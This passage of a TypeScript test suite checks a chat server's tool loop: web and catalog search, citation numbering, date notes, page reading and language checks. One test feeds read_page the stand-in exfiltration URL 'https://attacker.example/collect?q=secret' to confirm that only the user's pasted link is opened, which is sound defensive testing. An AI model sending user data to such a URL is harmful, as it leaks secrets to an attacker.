// A native turn's tool loop, driven through the real endpoint with a stubbed fetch and fake
// retrieval engines. The contract: the model sees every tool it may call, each search's evidence goes
// back as the tool message, citation numbers continue across searches so [n] means one source for the
// whole turn, and the sources reach the stream so the UI can show and persist them.
import { describe, it, expect, vi, afterEach } from "vitest";
import { SEARCH_RESULTS_ARE_NOT_THE_CONVERSATION } from "../search/webEvidence";

vi.mock("$lib/chat/server/logger", () => ({
	logger: { warn: vi.fn(), info: vi.fn(), error: vi.fn(), debug: vi.fn(), trace: vi.fn(), fatal: vi.fn() },
}));
vi.mock("$lib/chat/server/flags", () => ({
	flagEnabledOr: (_k: string, fallback: () => boolean) => fallback(),
	ensureFlagsPolled: async () => {},
	flagsDebugState: () => ({ polledOk: true, lastRefreshAt: 0, size: 1 }),
}));

const { endpointOai } = await import("../endpoints/openai/endpointOai");
const { nativeToolKit } = await import("./nativeTools");
const { logger } = await import("$lib/chat/server/logger");

const MODEL = "mistral-large-2512";
function sse(chunks: Array<{ delta: Record<string, unknown>; finish?: string | null }>): string {
	return (
		chunks
			.map(
				({ delta, finish = null }) =>
					`data: ${JSON.stringify({ id: "c", object: "chat.completion.chunk", created: 0, model: MODEL, choices: [{ index: 0, delta, finish_reason: finish }] })}\n\n`
			)
			.join("") + "data: [DONE]\n\n"
	);
}
const call = (name: string, args: object, id: string) =>
	sse([
		{
			delta: {
				role: "assistant",
				content: "",
				tool_calls: [{ id, index: 0, type: "function", function: { name, arguments: JSON.stringify(args) } }],
			},
			finish: "tool_calls",
		},
	]);
const answer = (text: string) => sse([{ delta: { role: "assistant", content: text } }, { delta: {}, finish: "stop" }]);

function stub(bodies: string[]) {
	const sent: Array<Record<string, unknown>> = [];
	let i = 0;
	vi.stubGlobal(
		"fetch",
		vi.fn(async (_u: unknown, init?: RequestInit) => {
			sent.push(JSON.parse(String(init?.body ?? "{}")));
			return new Response(bodies[Math.min(i++, bodies.length - 1)], {
				status: 200,
				headers: { "content-type": "text/event-stream" },
			});
		})
	);
	return sent;
}

type WebOpts = { onFailed?: (w: string) => void; ctx?: { latest?: boolean } };
const hit = (url: string, query = "q") => ({ title: url, url, snippet: `WEB EVIDENCE for ${query}`, engine: "Wikipedia" as const });
function engines() {
	const seen: Array<{ engine: string; query: string; startAt?: number }> = [];
	return {
		seen,
		// The retrieval engine returns its hits unnumbered; the kit numbers them.
		web: vi.fn(async (query: string, _o?: WebOpts) => {
			seen.push({ engine: "web", query });
			return { query, merged: [hit("https://w/1", query), hit("https://w/2", query)], asOf: "2026-09-30", relevanceVerified: true };
		}),
		catalog: vi.fn(async (query: string, _l: unknown, startAt = 0) => {
			seen.push({ engine: "catalog", query, startAt });
			return {
				query,
				sources: [{ n: startAt + 1, title: "Proj", url: "https://c/1", snippet: "c" }],
				evidence: `CATALOG EVIDENCE for ${query}`,
				asOf: "2026-09-30",
				relevanceVerified: true,
			};
		}),
	};
}

async function run(kit: ReturnType<typeof nativeToolKit>) {
	const endpoint = await endpointOai({
		type: "openai",
		baseURL: "https://api.mistral.ai/v1",
		apiKey: "sk-test",
		model: { id: MODEL, name: MODEL, parameters: {}, supportsTools: true },
	});
	const stream = await endpoint({
		messages: [{ from: "user", content: "what's new with project X?" }],
		locals: undefined,
		servesUserAnswer: true,
		nativeTools: kit,
	} as Parameters<typeof endpoint>[0]);
	const outputs = [];
	for await (const o of stream) outputs.push(o);
	return outputs;
}

afterEach(() => vi.unstubAllGlobals());

describe("a native turn offers its tools and runs the ones the model calls", () => {
	it("offers web_search, search_catalog, calculate and current_datetime when search is on", async () => {
		const e = engines();
		const sent = stub([answer("hi")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const names = (sent[0].tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
		expect(names).toEqual(["web_search", "search_catalog", "calculate", "current_datetime"]);
		expect(sent[0].tool_choice).toBe("auto");
	});
	it("withholds web_search when search is off, and keeps catalog, calculate and current_datetime", async () => {
		const sent = stub([answer("hi")]);
		await run(nativeToolKit({ locals: undefined, web: false, engines: engines() as never }));
		const names = (sent[0].tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
		expect(names).toEqual(["search_catalog", "calculate", "current_datetime"]);
	});
	it("withholds web_search, and forces no search, for a live value no source here carries, even with search 'always'", async () => {
		const sent = stub([call("web_search", { query: "score now" }, "c1"), answer("ok")]);
		const e = engines();
		await run(nativeToolKit({ locals: undefined, web: true, preSearch: { query: "score now" }, liveUnservable: true, engines: e as never }));
		const names = (sent[0].tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
		expect(names).not.toContain("web_search");
		expect(names).toContain("search_catalog");
		expect(sent[0].tool_choice).not.toEqual({ type: "function", function: { name: "web_search" } });
		expect(e.web).not.toHaveBeenCalled();
	});

	// A provider may ignore a forced tool_choice or refuse it
	// beside thinking, so the server runs the search and the first request goes out on "auto".
	it("runs the search before round 1 and sends round 1 on tool_choice auto with the numbered results in context (a search the gate or 'always' asked for)", async () => {
		const sent = stub([answer("Per the report [1].")]);
		const e = engines();
		const outputs = await run(
			nativeToolKit({ locals: undefined, web: true, preSearch: { query: "what is new with project X" }, engines: e as never })
		);
		expect(e.web).toHaveBeenCalledTimes(1);
		expect(e.seen).toEqual([{ engine: "web", query: "what is new with project X" }]);
		expect(sent).toHaveLength(1);
		expect(sent[0].tool_choice).toBe("auto");
		const names = (sent[0].tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
		expect(names).toContain("web_search");
		const msgs = sent[0].messages as Array<{ role: string; content: string; tool_calls?: Array<{ id: string }>; tool_call_id?: string }>;
		const tool = msgs.find((m) => m.role === "tool");
		expect(tool?.content).toContain("WEB EVIDENCE for what is new with project X");
		expect(tool?.content).toContain("Cite each fact you take from these sources inline by its number ([1] to [2])");
		const asked = msgs.find((m) => m.tool_calls);
		expect(asked?.tool_calls?.[0].id).toBe(tool?.tool_call_id);
		// What the UI reads from a model's web_search call: the live line and the numbered sources.
		expect(outputs.find((o) => o.toolRetrieval)?.toolRetrieval).toBe("web");
		expect(outputs.filter((o) => o.toolSources).at(-1)?.toolSources?.webSearch?.sources.map((s) => s.url)).toEqual(["https://w/1", "https://w/2"]);
	});

	it("sends no forced tool_choice on any request of a turn that searched first, and leaves web_search offered for a follow-up", async () => {
		const sent = stub([call("web_search", { query: "follow-up" }, "c9"), answer("Done [1][3].")]);
		const e = engines();
		await run(nativeToolKit({ locals: undefined, web: true, preSearch: { query: "first" }, engines: e as never }));
		expect(sent.map((b) => b.tool_choice)).toEqual(["auto", "auto"]);
		expect(e.seen.map((s) => s.query)).toEqual(["first", "follow-up"]);
		// The follow-up's sources continue after the server's own search: [3] and [4].
		const second = (sent[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === "tool");
		expect(second[1].content).toContain("[3]");
	});

	it("searches nothing ahead and sends auto when no search was asked for (the gate said no)", async () => {
		const sent = stub([answer("hi")]);
		const e = engines();
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		expect(e.web).not.toHaveBeenCalled();
		expect(sent[0].tool_choice).toBe("auto");
		expect((sent[0].messages as Array<{ role: string }>).some((m) => m.role === "tool")).toBe(false);
	});

	it("shapes the person's own message for search, where the model's own query is already shaped", async () => {
		stub([answer("hi")]);
		const e = engines();
		await run(nativeToolKit({ locals: undefined, web: true, preSearch: { query: "and in Spain?", history: [{ from: "user", content: "rent rules in France" }] }, engines: e as never }));
		const opts = e.web.mock.calls[0][1] as unknown as { preShaped: boolean; history: unknown[] };
		expect(opts.preShaped).toBe(false);
		expect(opts.history).toHaveLength(1);
	});
});

describe("citation numbers are one namespace across every search in the turn", () => {
	it("numbers our sources after the person's own pasted [1]..[k]", async () => {
		const e = engines();
		stub([call("web_search", { query: "project X news" }, "c1"), answer("X shipped [3].")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never, visitorSourceCount: 2 }));
		expect(e.seen).toEqual([{ engine: "web", query: "project X news" }]);
		const last = outputs.filter((o) => o.toolSources).at(-1)?.toolSources;
		expect(last?.webSearch?.sources.map((s) => s.n)).toEqual([3, 4]);
	});
	it("numbers the second search after the first, sends each evidence back, and streams the sources", async () => {
		const e = engines();
		const sent = stub([
			call("search_catalog", { query: "project X" }, "c1"),
			call("web_search", { query: "project X news" }, "c2"),
			answer("X shipped [3]."),
		]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));

		expect(e.seen).toEqual([
			{ engine: "catalog", query: "project X", startAt: 0 },
			{ engine: "web", query: "project X news" },
		]);
		const toolMsgs = (sent[2].messages as Array<{ role: string; content: string }>).filter((m) => m.role === "tool");
		const note = (range: string) =>
			`\n\n${SEARCH_RESULTS_ARE_NOT_THE_CONVERSATION} Cite each fact you take from these sources inline by its number (${range}), right after the sentence that uses it.`;
		expect(toolMsgs.map((m) => m.content)).toEqual([
			"CATALOG EVIDENCE for project X" + note("[1]"),
			expect.stringMatching(/^\[2\] https:\/\/w\/1 .*\nWEB EVIDENCE for project X news\n[\s\S]*\n\[3\] https:\/\/w\/2 /),
		]);
		// A web result also ends with today's date, which has its own test below.
		expect(toolMsgs[1].content).toContain("https://w/2" + note("[2] to [3]") + "\n\nToday is ");
		const last = outputs.filter((o) => o.toolSources).at(-1)?.toolSources;
		expect(last?.rag?.sources.map((s) => s.n)).toEqual([1]);
		expect(last?.webSearch?.sources.map((s) => s.n)).toEqual([2, 3]);
		expect(outputs.find((o) => o.generated_text)?.generated_text).toBe("X shipped [3].");
	});
	it("ends a web result with today's date in the person's zone, so a source's date never stands in for today", async () => {
		vi.useFakeTimers({ toFake: ["Date"] });
		vi.setSystemTime(new Date("2026-10-18T01:35:00Z"));
		try {
			const sent = stub([call("web_search", { query: "today's date in Auckland" }, "c1"), answer("ok")]);
			await run(nativeToolKit({ locals: { timezone: "Pacific/Auckland" } as never, web: true, engines: engines() as never }));
			const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
			expect(tool?.content).toContain("Today is Sunday, 18 October 2026 (Pacific/Auckland)");
			expect(tool?.content).toContain("A date shown in a source is that page's own date, not today's");
			// On a Sunday a model can name the day before as this coming Saturday.
			expect(tool?.content).toContain("The next Saturday after today is Saturday, 24 October 2026");
		} finally {
			vi.useRealTimers();
		}
	});
	it("gives a web result the UTC clock beside the person's date, so another place's date is never the person's day", async () => {
		vi.useFakeTimers({ toFake: ["Date"] });
		// Los Angeles still on Tuesday, Auckland already on Wednesday.
		vi.setSystemTime(new Date("2026-10-21T01:52:00Z"));
		try {
			const sent = stub([call("web_search", { query: "today's date in Auckland" }, "c1"), answer("ok")]);
			await run(nativeToolKit({ locals: { timezone: "America/Los_Angeles" } as never, web: true, engines: engines() as never }));
			const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
			expect(tool?.content).toContain("Today is Tuesday, 20 October 2026 (America/Los_Angeles)");
			expect(tool?.content).toContain("the time now in UTC, Wednesday, 21 October 2026, 01:52 UTC");
			expect(tool?.content).toContain("never from the person's date or a source");
		} finally {
			vi.useRealTimers();
		}
	});
	it("gives a web result the server's clock in each place the question names, so asked from Honolulu for Auckland's time the model never works out the offset itself", async () => {
		vi.useFakeTimers({ toFake: ["Date"] });
		// Zone check: 07:15Z is 20:15 Saturday in Auckland and 21:15 Friday in Honolulu.
		vi.setSystemTime(new Date("2026-11-07T07:15:00Z"));
		try {
			const sent = stub([call("web_search", { query: "time in Auckland now" }, "c1"), answer("ok")]);
			await run(
				nativeToolKit({
					locals: { timezone: "America/Los_Angeles" } as never,
					web: true,
					asked: "I'm in Honolulu. What day and time is it in Auckland right now?",
					engines: engines() as never,
				})
			);
			const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
			expect(tool?.content).toContain(
				"Friday 2026-11-06 21:15 in Pacific/Honolulu (UTC-10:00), which is 9:15 pm there; Saturday 2026-11-07 20:15 in Pacific/Auckland (UTC+13:00), which is 8:15 pm there"
			);
			expect(tool?.content).toContain("never a source's time and never one worked out from an offset");
		} finally {
			vi.useRealTimers();
		}
	});
	// The visitor's note under the answer reads this: a search that finished empty streams `searchEmpty`
	// and the model is told to open its answer with it.
	it("tells the model nothing was found, numbers nothing, and streams that the search found nothing when it comes back empty", async () => {
		const e = engines();
		e.web.mockResolvedValueOnce({ query: "q", merged: [], asOf: "", relevanceVerified: true });
		const sent = stub([call("web_search", { query: "q" }, "c1"), answer("nothing")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toMatch(/Begin your answer by saying that the search found nothing/);
		expect(outputs.filter((o) => o.toolSources).map((o) => o.toolSources)).toEqual([{ searchEmpty: true }]);
	});
	it("streams no empty-search note once a later search in the turn grounds it", async () => {
		const e = engines();
		e.web.mockResolvedValueOnce({ query: "q", merged: [], asOf: "", relevanceVerified: true });
		stub([call("web_search", { query: "q" }, "c1"), call("web_search", { query: "q2" }, "c2"), answer("ok [1]")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const last = outputs.filter((o) => o.toolSources).at(-1)?.toolSources;
		expect(last?.searchEmpty).toBeUndefined();
		expect(last?.webSearch?.sources.length).toBe(2);
	});
	// A search that did not finish is not one that found nothing, to the model or to the visitor.
	it("tells the model the search didn't finish, and streams that it failed, when the search times out", async () => {
		const e = engines();
		e.web.mockImplementationOnce(async (_q: string, o?: WebOpts) => {
			(o as { onFailed?: (w: string) => void }).onFailed?.("timeout");
			return undefined as never;
		});
		const sent = stub([call("web_search", { query: "q" }, "c1"), answer("from memory")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toMatch(/did not finish/);
		expect(outputs.filter((o) => o.toolSources).map((o) => o.toolSources)).toEqual([{ searchFailed: "timeout" }]);
	});
	// Without this line nothing records an engine's time or failure on a native turn.
	it("logs each search's per-engine time, including one the reranker rejected and one that failed", async () => {
		const e = engines();
		const timings = { enginesMs: 900, engineMs: { Firecrawl: 850, Wikipedia: 200 }, rerankMs: 40, enrichMs: 0 };
		e.web.mockImplementationOnce(async (query: string) => ({
			query, merged: [hit("https://w/1")], asOf: "2026-10-24", relevanceVerified: false, timings,
		}) as never);
		e.web.mockImplementationOnce(async (_q: string, o?: WebOpts) => {
			(o as { onFailed?: (w: string) => void }).onFailed?.("timeout");
			return undefined as never;
		});
		stub([call("web_search", { query: "a" }, "c1"), call("web_search", { query: "b" }, "c2"), answer("ok")]);
		vi.mocked(logger.info).mockClear();
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const lines = vi.mocked(logger.info).mock.calls.filter((c) => c[1] === "[native] web_search timing").map((c) => c[0]);
		expect(lines).toEqual([
			{ webMs: timings, sources: 1, verified: false, failed: undefined },
			{ webMs: undefined, sources: 0, verified: false, failed: "timeout" },
		]);
	});
	it("streams no failure once a later search in the turn grounds it", async () => {
		const e = engines();
		e.web.mockImplementationOnce(async (_q: string, o?: WebOpts) => {
			(o as { onFailed?: (w: string) => void }).onFailed?.("error");
			return undefined as never;
		});
		stub([call("web_search", { query: "q" }, "c1"), call("web_search", { query: "q2" }, "c2"), answer("ok [1]")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const last = outputs.filter((o) => o.toolSources).at(-1)?.toolSources;
		expect(last?.searchFailed).toBeUndefined();
		expect(last?.webSearch?.sources.length).toBe(2);
	});
	it("grounds on no web result the reranker did not verify, as the scaffolded path's gate does", async () => {
		const e = engines();
		e.web.mockResolvedValueOnce({
			query: "q",
			merged: [{ ...hit("https://w/unvetted"), snippet: "UNVETTED EVIDENCE" }],
			asOf: "2026-09-30",
			relevanceVerified: false,
		});
		const sent = stub([call("web_search", { query: "q" }, "c1"), answer("nothing")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toMatch(/search found nothing/);
		expect(tool?.content).not.toContain("UNVETTED EVIDENCE");
		expect(outputs.filter((o) => o.toolSources).map((o) => o.toolSources)).toEqual([{ searchEmpty: true }]);
	});
	it("refuses a web search the kit did not offer rather than running it", async () => {
		const e = engines();
		const sent = stub([call("web_search", { query: "q" }, "c1"), answer("ok")]);
		await run(nativeToolKit({ locals: undefined, web: false, engines: e as never }));
		expect(e.web).not.toHaveBeenCalled();
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toMatch(/no tool named web_search/);
	});
});

// The live line under a native turn. The scaffolded path says "Searching the web…" from its
// search gate; a native turn has no gate, so each tool round announces what it is about to retrieve.
describe("each tool round says what it retrieves before it runs, and never claims a web search it did not run", () => {
	it("announces the web before web_search runs, ahead of the sources it finds", async () => {
		stub([call("web_search", { query: "q" }, "c1"), answer("ok [1]")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: engines() as never }));
		const announced = outputs.findIndex((o) => o.toolRetrieval);
		expect(outputs[announced]?.toolRetrieval).toBe("web");
		expect(announced).toBeLessThan(outputs.findIndex((o) => o.toolSources));
	});
	it("says documents, not the web, for a round that only searches the catalog", async () => {
		stub([call("search_catalog", { query: "q" }, "c1"), answer("ok [1]")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: engines() as never }));
		expect(outputs.flatMap((o) => (o.toolRetrieval ? [o.toolRetrieval] : []))).toEqual(["documents"]);
	});
	it("says nothing about the web when the model calls a web_search the kit withheld", async () => {
		stub([call("web_search", { query: "q" }, "c1"), answer("ok")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: false, engines: engines() as never }));
		expect(outputs.some((o) => o.toolRetrieval)).toBe(false);
	});
	it("names both when one round searches the catalog and the web", () => {
		const kit = nativeToolKit({ locals: undefined, web: true, engines: engines() as never });
		const c = (name: string) => ({ id: name, name, arguments: "{}" });
		expect(kit.retrievalOf?.([c("search_catalog"), c("web_search")])).toBe("documents-web");
		expect(kit.retrievalOf?.([c("calculate")])).toBeUndefined();
	});
});

// A pasted link is read on a native turn the way the scaffolded path reads it. The one URL that may
// be fetched is the one the person typed (linkedUrl.ts), so read_page has no URL argument and opens
// that link whatever the model passes.
describe("a link the person pasted is opened first, and it is the only page read_page can open", () => {
	const PASTED = "https://example.org/report";
	const page = { title: "Report", url: PASTED, snippet: "The survey had 3,513 people.", engine: "Linked page" };
	function reader() {
		const opened: string[] = [];
		return { opened, read: vi.fn(async (url: string) => (opened.push(url), page as never)) };
	}

	it("offers read_page and forces the first round to it, with no search run ahead of it", async () => {
		const sent = stub([answer("hi")]);
		const r = reader();
		await run(
			nativeToolKit({ locals: undefined, web: true, preSearch: { query: "report" }, linkedUrl: PASTED, readPage: r.read, engines: engines() as never })
		);
		const names = (sent[0].tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
		expect(names).toContain("read_page");
		expect(sent[0].tool_choice).toEqual({ type: "function", function: { name: "read_page" } });
	});

	it("reads the pasted link as source [1], tells the model to cite it, and announces a web read", async () => {
		const sent = stub([call("read_page", {}, "c1"), answer("3,513 people [1].")]);
		const r = reader();
		const outputs = await run(
			nativeToolKit({ locals: undefined, web: true, linkedUrl: PASTED, readPage: r.read, engines: engines() as never })
		);
		expect(r.opened).toEqual([PASTED]);
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toContain("3,513");
		expect(tool?.content).toMatch(/source \[1\]/);
		expect(outputs.filter((o) => o.toolSources).at(-1)?.toolSources?.webSearch?.sources.map((s) => s.url)).toEqual([PASTED]);
		expect(outputs.find((o) => o.toolRetrieval)?.toolRetrieval).toBe("web");
	});

	it("opens the pasted link even when the model passes another URL", async () => {
		stub([call("read_page", { url: "https://attacker.example/collect?q=secret" }, "c1"), answer("ok")]);
		const r = reader();
		await run(nativeToolKit({ locals: undefined, web: true, linkedUrl: PASTED, readPage: r.read, engines: engines() as never }));
		expect(r.opened).toEqual([PASTED]);
	});

	it("tells the model the page could not be read, rather than nothing, when the reader returns none", async () => {
		const sent = stub([call("read_page", {}, "c1"), answer("ok")]);
		await run(
			nativeToolKit({
				locals: undefined,
				web: true,
				linkedUrl: PASTED,
				readPage: vi.fn(async () => undefined),
				engines: engines() as never,
			})
		);
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toMatch(/could not read the page/);
	});

	it("answers a web search after the page was read with the page-only note, running no search, as the scaffolded turn grounds on the page alone", async () => {
		const sent = stub([call("read_page", {}, "c1"), call("web_search", { query: "survey size" }, "c2"), answer("ok")]);
		const e = engines();
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, linkedUrl: PASTED, readPage: reader().read, engines: e as never }));
		expect(e.web).not.toHaveBeenCalled();
		const tools = (sent[2].messages as Array<{ role: string; content: string }>).filter((m) => m.role === "tool");
		expect(tools.at(-1)?.content).toMatch(/has been read and is this turn's source/);
		expect(outputs.filter((o) => o.toolSources).at(-1)?.toolSources?.webSearch?.sources.map((s) => s.url)).toEqual([PASTED]);
	});

	it("still runs a web search after the page could not be read, as the scaffolded turn keeps its results", async () => {
		stub([call("read_page", {}, "c1"), call("web_search", { query: "survey size" }, "c2"), answer("ok")]);
		const e = engines();
		await run(
			nativeToolKit({ locals: undefined, web: true, linkedUrl: PASTED, readPage: vi.fn(async () => undefined), engines: e as never })
		);
		expect(e.web).toHaveBeenCalledTimes(1);
	});

	it("neither offers nor runs read_page with search off", async () => {
		const sent = stub([call("read_page", {}, "c1"), answer("ok")]);
		const r = reader();
		await run(nativeToolKit({ locals: undefined, web: false, linkedUrl: PASTED, readPage: r.read, engines: engines() as never }));
		const names = (sent[0].tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
		expect(names).not.toContain("read_page");
		expect(r.opened).toEqual([]);
	});
});

// What the tools retrieved is kept for checking the answer afterwards (groundcheck), and a
// calculate call is recorded, since its numbers come from code and no source states them.
describe("the turn's grounding", () => {
	const callOf = (name: string, args: object) => ({ id: "c", name, arguments: JSON.stringify(args) });

	it("holds every search's evidence and sources, in call order", async () => {
		const kit = nativeToolKit({ locals: undefined, web: true, engines: engines() as never });
		await kit.run(callOf("web_search", { query: "peru" }) as never);
		await kit.run(callOf("search_catalog", { query: "apertus" }) as never);
		const g = kit.grounding();
		expect(g.evidence).toEqual([expect.stringMatching(/^\[1\] https:\/\/w\/1 .*\nWEB EVIDENCE for peru\n/), "CATALOG EVIDENCE for apertus"]);
		expect(g.sources.map((s) => s.n)).toEqual([1, 2, 3]);
		expect(g.calculated).toBe(false);
	});

	// Mistral Large 4 can ask for several searches in one round, and run one after another they can
	// outlast the turn's time cap.
	it("runs a round's searches side by side, and still numbers them in call order when the first finishes last", async () => {
		const e = engines();
		let inFlight = 0;
		let most = 0;
		e.web.mockImplementation(async (query: string) => {
			inFlight++;
			most = Math.max(most, inFlight);
			await new Promise((r) => setTimeout(r, query === "slow" ? 60 : 10));
			inFlight--;
			return { query, merged: [hit(`https://w/${query}`, query)], asOf: "2026-10-28", relevanceVerified: true };
		});
		const kit = nativeToolKit({ locals: undefined, web: true, engines: e as never });
		const [slow, fast] = await Promise.all([
			kit.run(callOf("web_search", { query: "slow" }) as never),
			kit.run(callOf("web_search", { query: "fast" }) as never),
		]);
		expect(most).toBe(2);
		expect(slow.webSearch?.sources.map((s) => [s.n, s.url])).toEqual([[1, "https://w/slow"]]);
		expect(fast.webSearch?.sources.map((s) => [s.n, s.url])).toEqual([
			[1, "https://w/slow"],
			[2, "https://w/fast"],
		]);
		expect(fast.content.startsWith("[2] https://w/fast")).toBe(true);
	});

	it("holds nothing from a search that found nothing", async () => {
		const e = engines();
		e.web.mockResolvedValueOnce(undefined as never);
		const kit = nativeToolKit({ locals: undefined, web: true, engines: e as never });
		await kit.run(callOf("web_search", { query: "nothing" }) as never);
		expect(kit.grounding().evidence).toEqual([]);
	});

	it("records that calculate ran", async () => {
		const kit = nativeToolKit({ locals: undefined, web: true, engines: engines() as never });
		await kit.run(callOf("calculate", { expression: "2+2" }) as never);
		expect(kit.grounding().calculated).toBe(true);
	});
});

describe("a web search for the latest of something also looks at the past year", () => {
	const latestOf = (e: ReturnType<typeof engines>) =>
		(e.web.mock.calls[0]?.[1] as { ctx?: { latest?: boolean } } | undefined)?.ctx?.latest;
	it("marks the search latest when the person asked for the most recent thing, though the model's query dropped it", async () => {
		const e = engines();
		stub([call("web_search", { query: "ECB interest rate decision" }, "c1"), answer("Held [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, latest: true, engines: e as never }));
		expect(latestOf(e)).toBe(true);
	});
	it("marks the search latest when only the model's query asks for the latest", async () => {
		const e = engines();
		stub([call("web_search", { query: "latest ECB interest rate decision" }, "c1"), answer("Held [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		expect(latestOf(e)).toBe(true);
	});
	it("leaves a search that only names a year unmarked: the 2024 election wants 2024's pages", async () => {
		const e = engines();
		stub([call("web_search", { query: "2024 US presidential election winner" }, "c1"), answer("Trump [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		expect(latestOf(e)).toBe(false);
	});
	it("leaves a timeless question's search unmarked", async () => {
		const e = engines();
		stub([call("web_search", { query: "how does the ECB set interest rates" }, "c1"), answer("It votes [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		expect(latestOf(e)).toBe(false);
	});
});

describe("calculate asks for each group's count before the expression only for a model whose row sets it", () => {
	const required = (kit: ReturnType<typeof nativeToolKit>) =>
		(kit.definitions.find((d) => d.function.name === "calculate")?.function.parameters as { required?: string[] }).required;
	it("without calculateCounts, calculate requires the expression alone, as an unlisted model is offered it", () => {
		expect(required(nativeToolKit({ locals: undefined, web: true, engines: engines() as never }))).toEqual(["expression"]);
	});
	it("with calculateCounts, requires counts and expression, and evaluates the expression alone", async () => {
		const kit = nativeToolKit({ locals: undefined, web: true, engines: engines() as never, calculateCounts: true });
		expect(required(kit)).toEqual(["counts", "expression"]);
		const args = { counts: "full-time: 7\nhalf-time: 5", expression: "7 + 5 * 0.5" };
		const out = await kit.run({ id: "c", name: "calculate", arguments: JSON.stringify(args) } as never);
		expect(out.content).toBe("9.5");
		expect(out.calculation).toEqual({ ...args, result: "9.5" });
	});
});

describe("a query in another non-English language than the person's is sent back once for a rewrite", () => {
	const langs: Record<string, string> = {
		"diseñador del Park Güell": "spa",
		"dissenyador del Park Güell": "cat",
		"Park Güell designer": "eng",
	};
	const readLanguage = async (t: string) => langs[t];
	const toolMessages = (sent: Array<Record<string, unknown>>, i: number) =>
		(sent[i].messages as Array<{ role: string; content: string }>).filter((m) => m.role === "tool");

	it("sends a Spanish query on a Catalan question back unsearched, then searches the Catalan rewrite", async () => {
		const e = engines();
		const sent = stub([
			call("web_search", { query: "diseñador del Park Güell" }, "c1"),
			call("web_search", { query: "dissenyador del Park Güell" }, "c2"),
			answer("Gaudí [1]."),
		]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never, askedLanguage: "cat", readLanguage }));
		expect(e.seen).toEqual([{ engine: "web", query: "dissenyador del Park Güell" }]);
		expect(toolMessages(sent, 1)[0].content).toBe(
			"No search was run: this query is not in Catalan, the language the person wrote in. Call web_search again with the query written in Catalan."
		);
	});
	it("searches a second mismatched query as written, so a model that keeps its language still gets results", async () => {
		const e = engines();
		stub([
			call("web_search", { query: "diseñador del Park Güell" }, "c1"),
			call("web_search", { query: "diseñador del Park Güell" }, "c2"),
			answer("Gaudí [1]."),
		]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never, askedLanguage: "cat", readLanguage }));
		expect(e.seen).toEqual([{ engine: "web", query: "diseñador del Park Güell" }]);
	});
	it("searches an English query on a Catalan question as written", async () => {
		const e = engines();
		stub([call("web_search", { query: "Park Güell designer" }, "c1"), answer("Gaudí [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never, askedLanguage: "cat", readLanguage }));
		expect(e.seen).toEqual([{ engine: "web", query: "Park Güell designer" }]);
	});
	it("searches the Spanish query as written when no language is set (flag off)", async () => {
		const e = engines();
		stub([call("web_search", { query: "diseñador del Park Güell" }, "c1"), answer("Gaudí [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never, readLanguage }));
		expect(e.seen).toEqual([{ engine: "web", query: "diseñador del Park Güell" }]);
	});
});

// A turn can search for over a minute, so each search shows on the live log as it starts and
// again when it comes back with its count, by number and never by query. The frames stream while the
// search runs, not after.
describe("each web search streams a progress frame when it starts and when it comes back", () => {
	const progress = (outputs: Awaited<ReturnType<typeof run>>) =>
		outputs.filter((o) => o.searchProgress).map((o) => o.searchProgress);

	it("streams a frame as the search starts, before the search has returned, and never the query", async () => {
		const e = engines();
		let returned = false;
		e.web.mockImplementationOnce(async (query: string) => {
			await new Promise((resolve) => setTimeout(resolve, 300));
			returned = true;
			return { query, merged: [hit("https://w/1", query)], asOf: "2026-10-29", relevanceVerified: true };
		});
		stub([call("web_search", { query: "eu ai act news" }, "c1"), answer("ok")]);
		const endpoint = await endpointOai({
			type: "openai",
			baseURL: "https://api.mistral.ai/v1",
			apiKey: "sk-test",
			model: { id: MODEL, name: MODEL, parameters: {}, supportsTools: true },
		});
		const stream = await endpoint({
			messages: [{ from: "user", content: "eu ai act news?" }],
			locals: undefined,
			servesUserAnswer: true,
			nativeTools: nativeToolKit({ locals: undefined, web: true, engines: e as never }),
		} as Parameters<typeof endpoint>[0]);
